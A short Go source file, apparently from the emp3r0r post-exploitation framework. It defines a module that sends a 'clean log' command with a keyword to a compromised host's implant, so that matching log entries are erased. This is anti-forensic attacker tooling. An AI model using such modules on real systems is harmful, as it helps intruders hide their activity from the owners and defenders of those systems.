package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleLogCleaner() {
	keywordOpt, ok := live.ActiveModule.Options["keyword"]
	if !ok {
		logging.Errorf("Option 'keyword' not found")
		return
	}
	cmd := fmt.Sprintf("%s --keyword %s", def.C2CmdCleanLog, keywordOpt.Val)
	err := CmdSender(cmd, "", live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
